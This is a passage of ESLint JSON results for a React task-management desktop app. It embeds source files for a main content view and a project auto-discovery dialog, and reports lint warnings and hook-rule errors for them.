scale: 1.02 }}\n            whileTap={{ scale: 0.98 }}\n          >\n            <div className=\"w-8 h-8 bg-gradient-to-br from-blue-500 to-purple-600 rounded-full flex items-center justify-center\">\n              <User className=\"w-4 h-4 text-white\" />\n            </div>\n          </motion.button>\n\n          {/* More options */}\n          <motion.button\n            className=\"p-2 rounded-lg hover:bg-accent/50 transition-colors\"\n            whileHover={{ scale: 1.05 }}\n            whileTap={{ scale: 0.95 }}\n          >\n            <MoreHorizontal className=\"w-4 h-4\" />\n          </motion.button>\n        </div>\n      </div>\n\n      {/* Progress bar */}\n      <motion.div \n        className=\"h-1 bg-gradient-to-r from-blue-500 via-purple-500 to-pink-500\"\n        initial={{ scaleX: 0 }}\n        animate={{ scaleX: analytics.completionRate / 100 }}\n        transition={{ duration: 1, ease: \"easeOut\" }}\n        style={{ transformOrigin: \"left\" }}\n      />\n    </motion.header>\n  )\n}","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/components/layout/MainContent.tsx","messages":[{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":56,"column":28,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":56,"endColumn":31,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1918,1921],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1918,1921],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":69,"column":28,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":69,"endColumn":31,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[2464,2467],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[2464,2467],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":83,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":83,"endColumn":19,"suggestions":[{"fix":{"range":[2999,3043],"text":""},"messageId":"removeConsole","data":{"propertyName":"info"},"desc":"Remove the console.info()."}]}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":3,"fixableErrorCount":0,"fixableWarningCount":0,"source":"import { motion, AnimatePresence } from 'framer-motion'\nimport { useTaskStore } from '@/store/useTaskStore'\nimport { TaskListView } from '@/components/views/TaskListView'\nimport { KanbanView } from '@/components/views/KanbanView'\nimport { CalendarView } from '@/components/views/CalendarView'\nimport { TimelineView } from '@/components/views/TimelineView'\nimport { AnalyticsView } from '@/components/views/AnalyticsView'\nimport { } from '@/components/views/PerformanceDashboard'\nimport { ClaudeConfigPage } from '@/components/claude/ClaudeConfigPage'\nimport { EmptyState } from '@/components/ui/EmptyState'\nimport { ErrorBoundary } from '@/components/error/ErrorBoundary'\nimport { \n  TaskListErrorFallback,\n  KanbanErrorFallback,\n  AnalyticsErrorFallback,\n  CalendarErrorFallback,\n  TimelineErrorFallback,\n  GenericViewErrorFallback\n} from '@/components/error/ViewErrorFallbacks'\nimport { createViewErrorHandler } from '@/utils/errorLogging'\n\n// Enhanced view configuration with error boundary settings\nconst viewConfigs = {\n  list: {\n    component: TaskListView,\n    errorFallback: TaskListErrorFallback,\n    displayName: 'Task List',\n    enableStatePreservation: true\n  },\n  kanban: {\n    component: KanbanView,\n    errorFallback: KanbanErrorFallback,\n    displayName: 'Kanban Board',\n    enableStatePreservation: true\n  },\n  calendar: {\n    component: CalendarView,\n    errorFallback: CalendarErrorFallback,\n    displayName: 'Calendar View',\n    enableStatePreservation: true\n  },\n  timeline: {\n    component: TimelineView,\n    errorFallback: TimelineErrorFallback,\n    displayName: 'Timeline View',\n    enableStatePreservation: true\n  },\n  analytics: {\n    component: AnalyticsView,\n    errorFallback: AnalyticsErrorFallback,\n    displayName: 'Analytics View',\n    enableStatePreservation: false // Analytics can be regenerated\n  },\n  'claude-config': {\n    component: ClaudeConfigPage,\n    errorFallback: (props: any) => <GenericViewErrorFallback {...props} viewType=\"Claude Config\" />,\n    displayName: 'Claude Configuration',\n    enableStatePreservation: false\n  }\n} as const\n\nexport function MainContent() {\n  const { viewMode, getFilteredTasks, setViewMode } = useTaskStore()\n  const tasks = getFilteredTasks()\n  \n  // Get view configuration with fallback for unknown view types\n  const viewConfig = viewConfigs[viewMode.type as keyof typeof viewConfigs] || {\n    component: () => <div>Unknown view type: {viewMode.type}</div>,\n    errorFallback: (props: any) => <GenericViewErrorFallback {...props} viewType={viewMode.type} />,\n    displayName: viewMode.type,\n    enableStatePreservation: false\n  }\n\n  const { component: ViewComponent, errorFallback: ErrorFallback, displayName, enableStatePreservation } = viewConfig\n\n  // Create view-specific error handler\n  const handleViewError = createViewErrorHandler(viewMode.type)\n\n  // Enhanced error recovery actions\n  const errorRecoveryActions = {\n    onRetry: () => {\n      // Force re-render by updating view mode timestamp or similar\n      console.info(`Retrying ${displayName} view`)\n    },\n    onGoHome: () => {\n      setViewMode({ type: 'list' })\n    },\n    onReload: () => {\n      window.location.reload()\n    }\n  }\n\n  // Create reset key for automatic error recovery when data changes\n  const resetKey = `${viewMode.type}_${tasks.length}_${JSON.stringify(viewMode)}`\n\n  return (\n    <motion.main \n      className=\"h-full overflow-hidden bg-background/30\"\n      layout\n      transition={{\n        type: \"spring\",\n        stiffness: 400,\n        damping: 30,\n      }}\n    >\n      <AnimatePresence mode=\"wait\">\n        <motion.div\n          key={viewMode.type}\n          initial={{ opacity: 0, y: 20 }}\n          animate={{ opacity: 1, y: 0 }}\n          exit={{ opacity: 0, y: -20 }}\n          transition={{\n            type: \"spring\",\n            stiffness: 400,\n            damping: 30,\n          }}\n          className=\"h-full\"\n        >\n          {/* Wrap view component with error boundary */}\n          <ErrorBoundary\n            level=\"component\"\n            viewType={viewMode.type}\n            resetKey={resetKey}\n            enableStatePreservation={enableStatePreservation}\n            onError={handleViewError}\n            fallback={<ErrorFallback {...errorRecoveryActions} />}\n          >\n            {tasks.length === 0 && viewMode.type !== 'analytics' && viewMode.type !== 'claude-config' ? (\n              <ErrorBoundary\n                level=\"component\"\n                viewType=\"empty-state\"\n                resetKey={`empty_${resetKey}`}\n                fallback={\n                  <div className=\"flex items-center justify-center h-full text-muted-foreground\">\n                    <p>Unable to display empty state</p>\n                  </div>\n                }\n              >\n                <EmptyState />\n              </ErrorBoundary>\n            ) : (\n              <ViewComponent />\n            )}\n          </ErrorBoundary>\n        </motion.div>\n      </AnimatePresence>\n    </motion.main>\n  )\n}","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/components/layout/Sidebar.tsx","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/components/project/ProjectDiscovery.tsx","messages":[{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":186,"column":65,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":186,"endColumn":68,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[5851,5854],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[5851,5854],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":1,"fixableErrorCount":0,"fixableWarningCount":0,"source":"import { useState } from 'react'\nimport { motion, AnimatePresence } from 'framer-motion'\nimport { \n  Search, \n  Zap, \n  Layers, \n  Settings,\n  Play,\n  CheckCircle2,\n  Folder,\n  GitBranch,\n  HardDrive,\n  Clock,\n  AlertTriangle,\n  Download,\n  Sparkles,\n  Target,\n  FileText\n} from 'lucide-react'\nimport { useProjectDiscovery } from '@/hooks/useProjectDiscovery'\nimport { cn, formatDate } from '@/lib/utils'\n\ninterface ProjectDiscoveryProps {\n  onClose: () => void\n  onProjectsAdded: () => void\n}\n\nexport function ProjectDiscovery({ onClose, onProjectsAdded }: ProjectDiscoveryProps) {\n  const [selectedPreset, setSelectedPreset] = useState<'quick' | 'deep' | 'custom'>('quick')\n  const [customOptions, setCustomOptions] = useState({\n    includeGitScan: true,\n    includeFullScan: false,\n    maxDepth: 6,\n    skipHidden: true,\n    skipSystem: true\n  })\n\n  const {\n    discoveredProjects,\n    isDiscovering,\n    progress,\n    selectedProjects,\n    error,\n    quickDiscovery,\n    deepDiscovery,\n    customDiscovery,\n    addSelectedProjects,\n    toggleProjectSelection,\n    selectAllProjects,\n    deselectAllProjects,\n    selectedCount,\n    totalDiscovered,\n    canAddProjects\n  } = useProjectDiscovery()\n\n  const presets = [\n    {\n      id: 'quick',\n      name: 'Quick Discovery',\n      description: 'Scan common development directories and git repositories',\n      icon: Zap,\n      color: 'from-emerald-500 to-teal-600',\n      duration: '30 seconds',\n      action: quickDiscovery\n    },\n    {\n      id: 'deep',\n      name: 'Deep Discovery',\n      description: 'Comprehensive system scan (may take several minutes)',\n      icon: Layers,\n      color: 'from-blue-500 to-indigo-600',\n      duration: '2-5 minutes',\n      action: deepDiscovery\n    },\n    {\n      id: 'custom',\n      name: 'Custom Discovery',\n      description: 'Configure your own discovery parameters',\n      icon: Settings,\n      color: 'from-purple-500 to-pink-600',\n      duration: 'Variable',\n      action: () => customDiscovery(customOptions)\n    }\n  ]\n\n  const handleStartDiscovery = async () => {\n    const preset = presets.find(p => p.id === selectedPreset)\n    if (preset) {\n      const result = await preset.action()\n      if (!result.success) {\n        alert(`Discovery failed: ${result.error}`)\n      }\n    }\n  }\n\n  const handleAddProjects = async () => {\n    const result = await addSelectedProjects()\n    if (result.success) {\n      onProjectsAdded()\n      if (result.added > 0) {\n        alert(`Successfully added ${result.added} projects!`)\n      }\n      if (result.failed > 0) {\n        alert(`Warning: ${result.failed} projects failed to add. Check console for details.`)\n      }\n    } else {\n      alert(`Failed to add projects: ${result.error}`)\n    }\n  }\n\n  const getMethodIcon = (method: string) => {\n    switch (method) {\n      case 'git-scan': return GitBranch\n      case 'full-scan': return HardDrive\n      default: return Folder\n    }\n  }\n\n  const getMethodColor = (method: string) => {\n    switch (method) {\n      case 'git-scan': return 'text-emerald-600 bg-emerald-100 dark:bg-emerald-900/20'\n      case 'full-scan': return 'text-blue-600 bg-blue-100 dark:bg-blue-900/20'\n      default: return 'text-orange-600 bg-orange-100 dark:bg-orange-900/20'\n    }\n  }\n\n  return (\n    <motion.div\n      initial={{ opacity: 0 }}\n      animate={{ opacity: 1 }}\n      exit={{ opacity: 0 }}\n      className=\"fixed inset-0 bg-background/80 backdrop-blur-sm z-50 flex items-center justify-center p-4\"\n      onClick={onClose}\n    >\n      <motion.div\n        initial={{ opacity: 0, scale: 0.95, y: -20 }}\n        animate={{ opacity: 1, scale: 1, y: 0 }}\n        exit={{ opacity: 0, scale: 0.95, y: -20 }}\n        className=\"w-full max-w-6xl bg-card border border-border/50 rounded-2xl shadow-2xl glass-morphism overflow-hidden\"\n        onClick={(e) => e.stopPropagation()}\n      >\n        {/* Header */}\n        <div className=\"p-6 border-b border-border/50 bg-gradient-to-r from-blue-50 via-purple-50 to-pink-50 dark:from-blue-950/20 dark:via-purple-950/20 dark:to-pink-950/20\">\n          <div className=\"flex items-center justify-between\">\n            <div className=\"flex items-center space-x-3\">\n              <div className=\"p-3 rounded-xl bg-gradient-to-br from-blue-500 to-purple-600\">\n                <Search className=\"w-6 h-6 text-white\" />\n              </div>\n              <div>\n                <h2 className=\"text-2xl font-bold gradient-text\">Project Auto-Discovery</h2>\n                <p className=\"text-muted-foreground\">\n                  Automatically find all TaskMaster projects on your computer\n                </p>\n              </div>\n            </div>\n            \n            <motion.button\n              onClick={onClose}\n              className=\"p-2 rounded-lg hover:bg-accent/50 transition-colors\"\n              whileHover={{ scale: 1.05 }}\n              whileTap={{ scale: 0.95 }}\n            >\n              âœ•\n            </motion.button>\n          </div>\n        </div>\n\n        <div className=\"flex h-[600px]\">\n          {/* Left Panel - Discovery Options */}\n          <div className=\"w-1/3 p-6 border-r border-border/50\">\n            <h3 className=\"font-semibold mb-4 flex items-center space-x-2\">\n              <Target className=\"w-4 h-4\" />\n              <span>Discovery Modes</span>\n            </h3>\n            \n            <div className=\"space-y-3\">\n              {presets.map((preset) => (\n                <motion.div\n                  key={preset.id}\n                  className={cn(\n                    \"p-4 rounded-xl border cursor-pointer transition-all duration-200\",\n                    selectedPreset === preset.id\n                      ? \"border-primary bg-primary/5 shadow-lg\"\n                      : \"border-border/50 hover:border-primary/50\"\n                  )}\n                  onClick={() => setSelectedPreset(preset.id as any)}\n                  whileHover={{ scale: 1.02 }}\n                  whileTap={{ scale: 0.98 }}\n                >\n                  <div className=\"flex items-start space-x-3\">\n                    <div className={cn(\n                      \"p-2 rounded-lg bg-gradient-to-br\",\n                      preset.color,\n                      \"text-white flex-shrink-0\"\n                    )}>\n                      <preset.icon className=\"w-4 h-4\" />\n                    </div>\n                    \n                    <div className=\"flex-1 min-w-0\">\n                      <h4 className=\"font-medium mb-1\">{preset.name}</h4>\n                      <p className=\"text-sm text-muted-foreground mb-2\">\n                        {preset.description}\n                      </p>\n                      <div className=\"flex items-center space-x-1 text-xs text-muted-foreground\">\n                        <Clock className=\"w-3 h-3\" />\n                        <span>~{preset.duration}</span>\n                      </div>\n                    </div>\n                  </div>\n                </motion.div>\n              ))}\n            </div>\n\n            {/* Custom Options */}\n            <AnimatePresence>\n              {selectedPreset === 'custom' && (\n                <motion.div\n                  initial={{ height: 0, opacity: 0 }}\n                  animate={{ height: 'auto', opacity: 1 }}\n                  exit={{ height: 0, opacity: 0 }}\n                  className=\"mt-4 p-4 bg-muted/20 rounded-lg overflow-hidden\"\n                >\n                  <h4 className=\"font-medium mb-3\">Custom Options</h4>\n                  <div className=\"space-y-3 text-sm\">\n                    <label className=\"flex items-center space-x-2\">\n                      <input\n                        type=\"checkbox\"\n                        checked={customOptions.includeGitScan}\n                        onChange={(e) => setCustomOptions(prev => ({\n                          ...prev,\n                          includeGitScan: e.target.checked\n                        }))}\n                        className=\"rounded\"\n                      />\n                      <span>Scan Git repositories</span>\n                    </label>\n                    \n                    <label className=\"flex items-center space-x-2\">\n                      <input\n                        type=\"checkbox\"\n                        checked={customOptions.includeFullScan}\n                        onChange={(e) => setCustomOptions(prev => ({\n                          ...prev,\n                          includeFullScan: e.target.checked\n                        }))}\n                        className=\"rounded\"\n                      />\n                      <span>Full system scan</span>\n                    </label>\n                    \n                    <label className=\"flex items-center space-x-2\">\n                      <input\n                        type=\"checkbox\"\n                        checked={customOptions.skipSystem}\n                        onChange={(e) => setCustomOptions(prev => ({\n                          ...prev,\n                          skipSystem: e.target.checked\n                        }))}\n                        className=\"rounded\"\n                      />\n                      <span>Skip system directories</span>\n                    </label>\n                    \n                    <div className=\"flex items-center space-x-2\">\n                      <span>Max depth:</span>\n                      <input\n                        type=\"number\"\n                        min=\"1\"\n                        max=\"10\"\n                        value={customOptions.maxDepth}\n                        onChange={(e) => setCustomOptions(prev => ({\n                          ...prev,\n                          maxDepth: parseInt(e.target.value) || 6\n                        }))}\n                        className=\"w-16 px-2 py-1 rounded border border-border/50\"\n                      />\n                    </div>\n                  </div>\n                </motion.div>\n              )}\n            </AnimatePresence>\n\n            {/* Start Discovery Button */}\n            <motion.button\n              onClick={handleStartDiscovery}\n              disabled={isDiscovering}\n              className={cn(\n                \"w-full mt-6 flex items-center justify-center space-x-2 px-4 py-3 rounded-xl\",\n                \"font-medium transition-all duration-200\",\n                isDiscovering\n                  ? \"bg-muted text-muted-foreground cursor-not-allowed\"\n                  : \"bg-gradient-to-r from-blue-500 to-purple-600 text-white hover:from-blue-600 hover:to-purple-700 shadow-lg hover:shadow-xl\"\n              )}\n              whileHover={!isDiscovering ? { scale: 1.02 } : {}}\n              whileTap={!isDiscovering ? { scale: 0.98 } : {}}\n            >\n              {isDiscovering ? (\n                <>\n                  <motion.div\n                    animate={{ rotate: 360 }}\n                    transition={{ duration: 1, repeat: Infinity, ease: \"linear\" }}\n                    className=\"w-4 h-4 border-2 border-current border-t-transparent rounded-full\"\n                  />\n                  <span>Discovering...</span>\n                </>\n              ) : (\n                <>\n                  <Play className=\"w-4 h-4\" />\n                  <span>Start Discovery</span>\n                </>\n              )}\n            </motion.button>\n          </div>\n\n          {/* Right Panel - Results */}\n          <div className=\"flex-1 flex flex-col\">\n            {/* Progress Bar */}\n            <AnimatePresence>\n              {isDiscovering && (\n                <motion.div\n                  initial={{ height: 0, opacity: 0 }}\n                  animate={{ height: 'auto', opacity: 1 }}\n                  exit={{ height: 0, opacity: 0 }}\n                  className=\"p-4 border-b border-border/50 bg-blue-50/50 dark:bg-blue-950/20\"\n                >\n                  <div className=\"flex items-center justify-between mb-2\">\n                    <span className=\"text-sm font-medium\">{progress.phase}</span>\n                    <span className=\"text-sm text-muted-foreground\">\n                      {progress.current}/{progress.total} â€¢ {progress.found} found\n                    </span>\n                  </div>\n                  <div className=\"w-full bg-muted/30 rounded-full h-2 overflow-hidden\">\n                    <motion.div\n                      className=\"h-full bg-gradient-to-r from-blue-500 to-purple-600 rounded-full\"\n                      initial={{ width: 0 }}\n                      animate={{ \n                        width: progress.total > 0 ? `${(progress.current / progress.total) * 100}%` : '0%' \n                      }}\n                      transition={{ duration: 0.3 }}\n                    />\n                  </div>\n                </motion.div>\n              )}\n            </AnimatePresence>\n\n            {/* Error Display */}\n            <AnimatePresence>\n              {error && (\n                <motion.div\n                  initial={{ height: 0, opacity: 0 }}\n                  animate={{ height: 'auto', opacity: 1 }}\n                  exit={{ height: 0, opacity: 0 }}\n                  className=\"p-4 border-b border-border/50 bg-red-50/50 dark:bg-red-950/20\"\n                >\n                  <div className=\"flex items-center space-x-2 text-red-600 dark:text-red-400\">\n                    <AlertTriangle className=\"w-4 h-4\" />\n                    <span className=\"text-sm font-medium\">Discovery Error</span>\n                  </div>\n                  <p className=\"text-sm text-red-600/80 dark:text-red-400/80 mt-1\">{error}</p>\n                </motion.div>\n              )}\n            </AnimatePresence>\n\n            {/* Results Header */}\n            <div className=\"p-4 border-b border-border/50\">\n              <div className=\"flex items-center justify-between\">\n                <div className=\"flex items-center space-x-3\">\n                  <h3 className=\"font-semibold\">Discovered Projects</h3>\n                  {totalDiscovered > 0 && (\n                    <span className=\"px-2 py-1 bg-primary/10 text-primary rounded-full text-sm\">\n                      {totalDiscovered} found\n                    </span>\n                  )}\n                </div>\n                \n                <div className=\"flex items-center space-x-2\">\n                  {totalDiscovered > 0 && (\n                    <>\n                      <motion.button\n                        onClick={selectAllProjects}\n                        className=\"text-sm text-blue-600 hover:text-blue-700 transition-colors\"\n                        whileHover={{ scale: 1.05 }}\n                        whileTap={{ scale: 0.95 }}\n                      >\n                        Select All\n                      </motion.button>\n                      <span className=\"text-muted-foreground\">â€¢</span>\n                      <motion.button\n                        onClick={deselectAllProjects}\n                        className=\"text-sm text-muted-foreground hover:text-foreground transition-colors\"\n                        whileHover={{ scale: 1.05 }}\n                        whileTap={{ scale: 0.95 }}\n                      >\n                        Deselect All\n                      </motion.button>\n                    </>\n                  )}\n                </div>\n              </div>\n            </div>\n\n            {/* Results List */}\n            <div className=\"flex-1 overflow-y-auto\">\n              {totalDiscovered === 0 ? (\n                <div className=\"h-full flex items-center justify-center\">\n                  <div className=\"text-center\">\n                    {isDiscovering ? (\n                      <>\n                        <Sparkles className=\"w-16 h-16 mx-auto mb-4 text-blue-500 animate-pulse\" />\n                        <h3 className=\"text-lg font-semibold mb-2\">Scanning for projects...</h3>\n                        <p className=\"text-muted-foreground\">\n                          {progress.phase || 'Searching your computer for TaskMaster projects'}\n                        </p>\n                      </>\n                    ) : (\n                      <>\n                        <Search className=\"w-16 h-16 mx-auto mb-4 text-muted-foreground opacity-50\" />\n                        <h3 className=\"text-lg font-semibold mb-2\">Ready to discover</h3>\n                        <p className=\"text-muted-foreground\">\n                          Choose a discovery mode and click \"Start Discovery\" to find your projects\n                        </p>\n                      </>\n                    )}\n                  </div>\n                </div>\n              ) : (\n                <div className=\"p-4 space-y-3\">\n                  {discoveredProjects.map((project, index) => {\n                    const MethodIcon = getMethodIcon(project.discoveryMethod)\n                    const isSelected = selectedProjects.has(project.id)\n                    \n                    return (\n                      <motion.div\n                        key={project.id}\n                        initial={{ opacity: 0, y: 20 }}\n                        animate={{ opacity: 1, y: 0 }}\n                        transition={{ delay: index * 0.05 }}\n                        className={cn(\n                          \"p-4 rounded-xl border cursor-pointer transition-all duration-200\",\n                          \"hover:border-primary/50 hover:shadow-md\",\n                          isSelected \n                            ? \"border-primary bg-primary/5 shadow-lg\" \n                            : \"border-border/50\"\n                        )}\n                        onClick={() => toggleProjectSelection(project.id)}\n                        whileHover={{ scale: 1.01 }}\n                        whileTap={{ scale: 0.99 }}\n                      >\n                        <div className=\"flex items-start justify-between\">\n                          <div className=\"flex items-start space-x-3 flex-1 min-w-0\">\n                            <motion.div\n                              className={cn(\n                                \"mt-1 w-5 h-5 rounded border-2 flex items-center justify-center\",\n                                isSelected \n                                  ? \"border-primary bg-primary text-primary-foreground\"\n                                  : \"border-muted-foreground\"\n                              )}\n                              whileHover={{ scale: 1.1 }}\n                              whileTap={{ scale: 0.9 }}\n                            >\n                              {isSelected && <CheckCircle2 className=\"w-3 h-3\" />}\n                            </motion.div>\n                            \n                            <div className=\"flex-1 min-w-0\">\n                              <div className=\"flex items-center space-x-2 mb-1\">\n                                <FileText className=\"w-4 h-4 text-muted-foreground\" />\n                                <h4 className=\"font-medium truncate\">{project.name}</h4>\n                              </div>\n                              <p className=\"text-sm text-muted-foreground truncate mb-2\">\n                                {project.path}\n                              </p>\n                              <div className=\"flex items-center space-x-3 text-xs\">\n                                <div className={cn(\n                                  \"flex items-center space-x-1 px-2 py-1 rounded-full\",\n                                  getMethodColor(project.discoveryMethod)\n                                )}>\n                                  <MethodIcon className=\"w-3 h-3\" />\n                                  <span className=\"capitalize\">\n                                    {project.discoveryMethod.replace('-', ' ')}\n                                  </span>\n                                </div>\n                                <span className=\"text-muted-foreground\">\n                                  Modified: {formatDate(project.lastModified)}\n                                </span>\n                              </div>\n                            </div>\n                          </div>\n                        </div>\n                      </motion.div>\n                    )\n                  })}\n                </div>\n              )}\n            </div>\n\n            {/* Footer */}\n            {totalDiscovered > 0 && (\n              <div className=\"p-4 border-t border-border/50 bg-muted/20\">\n                <div className=\"flex items-center justify-between\">\n                  <div className=\"text-sm text-muted-foreground\">\n                    {selectedCount} of {totalDiscovered} projects selected\n                  </div>\n                  \n                  <motion.button\n                    onClick={handleAddProjects}\n                    disabled={!canAddProjects}\n                    className={cn(\n                      \"flex items-center space-x-2 px-4 py-2 rounded-lg font-medium transition-all\",\n                      canAddProjects\n                        ? \"bg-emerald-600 text-white hover:bg-emerald-700 shadow-lg hover:shadow-xl\"\n                        : \"bg-muted text-muted-foreground cursor-not-allowed\"\n                    )}\n                    whileHover={canAddProjects ? { scale: 1.02 } : {}}\n                    whileTap={canAddProjects ? { scale: 0.98 } : {}}\n                  >\n                    <Download className=\"w-4 h-4\" />\n                    <span>Add Selected Projects</span>\n                  </motion.button>\n                </div>\n              </div>\n            )}\n          </div>\n        </div>\n      </motion.div>\n    </motion.div>\n  )\n}","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/components/project/ProjectManager.tsx","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/components/recovery/RecoveryDashboard.tsx","messages":[{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'Download' is defined but never used.","line":25,"column":3,"nodeType":null,"messageId":"unusedVar","endLine":25,"endColumn":11},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'Upload' is defined but never used.","line":26,"column":3,"nodeType":null,"messageId":"unusedVar","endLine":26,"endColumn":9},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'Info' is defined but never used.","line":31,"column":3,"nodeType":null,"messageId":"unusedVar","endLine":31,"endColumn":7},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'TrendingDown' is defined but never used.","line":33,"column":3,"nodeType":null,"messageId":"unusedVar","endLine":33,"endColumn":15},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'Minus' is defined but never used.","line":34,"column":3,"nodeType":null,"messageId":"unusedVar","endLine":34,"endColumn":8},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'FileText' is defined but never used.","line":35,"column":3,"nodeType":null,"messageId":"unusedVar","endLine":35,"endColumn":11},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'CrashRecoveryService' is defined but never used.","line":41,"column":10,"nodeType":null,"messageId":"unusedVar","endLine":41,"endColumn":30},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'HealthStatus' is defined but never used.","line":41,"column":32,"nodeType":null,"messageId":"unusedVar","endLine":41,"endColumn":44},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useState\" is called in function \"_RecoveryDashboard: React.FC<RecoveryDashboardProps>\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":81,"column":37,"nodeType":"Identifier","endLine":81,"endColumn":45},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useState\" is called in function \"_RecoveryDashboard: React.FC<RecoveryDashboardProps>\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":82,"column":47,"nodeType":"Identifier","endLine":82,"endColumn":55},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useState\" is called in function \"_RecoveryDashboard: React.FC<RecoveryDashboardProps>\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":83,"column":45,"nodeType":"Identifier","endLine":83,"endColumn":53},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useState\" is called in function \"_RecoveryDashboard: React.FC<RecoveryDashboardProps>\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":91,"column":33,"nodeType":"Identifier","endLine":91,"endColumn":41},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useState\" is called in function \"_RecoveryDashboard: React.FC<RecoveryDashboardProps>\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":92,"column":49,"nodeType":"Identifier","endLine":92,"endColumn":57},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useTaskStore\" is called in function \"_RecoveryDashboard: React.FC<RecoveryDashboardProps>\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":95,"column":21,"nodeType":"Identifier","endLine":95,"endColumn":33},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useErrorStore\" is called in function \"_RecoveryDashboard: React.FC<RecoveryDashboardProps>\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":96,"column":22,"nodeType":"Identifier","endLine":96,"endColumn":35},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useEffect\" is called in function \"_RecoveryDashboard: React.FC<RecoveryDashboardProps>\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word \"use\".","line":99,"column":3,"nodeType":"Identifier","endLine":99,"endColumn":12},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":102,"column":47,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":102,"endColumn":50,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[2755,2758],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[2755,2758],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":110,"column":49,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":110,"endColumn":52,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[3023,3026],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[3023,3026],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"react-hooks/exhaustive-deps","severity":1,"message":"React Hook useEffect has missing dependencies: 'backupManagers', 'errorStore', and 'taskStore'. Either include them or remove the dependency array.","line":132,"column":6,"nodeType":"ArrayExpression","endLine":132,"endColumn":8,"suggestions":[{"desc":"Update the dependencies array to be: [backupManagers, errorStore, taskStore]","fix":{"range":[3504,3506],"text":"[backupManagers, errorStore, taskStore]"}}]},{"ruleId":"react-hooks/rules-of-hooks","severity":2,"message":"React Hook \"useEffect\" is called in function \"_RecoveryDashboard: React.FC<RecoveryDashboardProps>\" that is neither a React function component nor a custom React Hook function. React component names must start with an uppercase letter. React Hook names must start with the word 